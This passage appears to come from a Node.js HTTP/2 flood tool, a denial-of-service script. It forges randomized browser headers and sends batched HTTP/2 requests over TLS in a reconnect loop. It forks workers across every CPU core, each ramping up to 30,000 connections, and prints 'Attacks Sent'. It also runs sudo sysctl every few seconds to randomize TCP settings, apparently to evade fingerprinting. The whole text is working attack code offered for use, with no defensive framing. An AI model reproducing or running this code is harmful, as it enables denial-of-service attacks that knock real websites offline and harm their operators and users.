                        "sec-ch-ua-platform": `"Windows"`,
                        "upgrade-insecure-requests": "1",
                        "user-agent": generateUserAgent(),
                        "accept": acceptHeaderValue,
                        ...(secGpcValue && { "sec-gpc": secGpcValue }),
                        ...(secChUaMobile && { "sec-ch-ua-mobile": secChUaMobile }),
                        ...(secChUaModel && { "sec-ch-ua-model": secChUaModel }),
                        ...(secChUaPlatform && { "sec-ch-ua-platform": secChUaPlatform }),
                        ...(secChUaPlatformVersion && { "sec-ch-ua-platform-version": secChUaPlatformVersion }),
                        ...(Math.random() < 0.5 && { "sec-fetch-site": currentRefererValue ? ref1 : "none" }),
                        ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                        ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                        ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": langValue,
                        ...(hcookie && { "cookie": hcookie }),
                        ...(currentRefererValue && { "referer": currentRefererValue }),
                        ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
                    }).filter(a => a[1] != null));

                    const packed = Buffer.concat([
                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                        hpack.encode(headers)
                    ]);

                    requests.push(encodeFrame(streamId, 1, packed, 0x25));
                    streamId += 2;
                    requestCount++;
                }

                tlsSocket.write(Buffer.concat(requests), (err) => {
                    if (!err) {
                        if(requestCount >= 5) {
                            tlsSocket.end(() => {
                                tlsSocket.destroy();
                                setTimeout(go, 100);
                            });
                        } else {
                            setTimeout(doWrite, isFull ? 1000 : 1000 / ratelimitValue);
                        }
                    }
                });
            }

            doWrite();
        }).on('error', (e) => {
            console.error('TLS error:', e.message);
            tlsSocket.destroy();
        });
    });

    netSocket.on('error', (e) => {
        console.error('TCP connection error:', e.message);
    });

    netSocket.once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => {
                tlsSocket.destroy();
                setTimeout(go, 100);
            });
        } else {
            setTimeout(go, 100);
        }
    });
}


function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, () => { });
}


setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 10) {
        custom_header = custom_header + 1;
        custom_window = custom_window + 1;
        custom_table = custom_table + 1;
        custom_update = custom_update + 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        timer = 0;
    }
}, 10000);

if (cluster.isMaster) {

    const workers = {}

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`Attacks Sent`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })
    if (debugMode) {
        setInterval(() => {

            let statuses = {}
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null)
                                statuses[code] = 0

                            statuses[code] += st[code]
                        }
                    }
                }
            }
            console.clear()
            console.log(new Date().toLocaleString('us'), statuses)
        }, 1000)
    }

    setInterval(TCP_CHANGES_SERVER, 5000);
    setTimeout(() => process.exit(1), time * 1000);

} else {
    let conns = 0

    let i = setInterval(() => {
        if (conns < 30000) {
            conns++

        } else {
            clearInterval(i)
            return
        }
        go()
    }, delay);


    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift()

            statusesQ.push(statuses)
            statuses = {}
            process.send(statusesQ)
        }, 250)
    }

    setTimeout(() => process.exit(1), time * 1000);
}
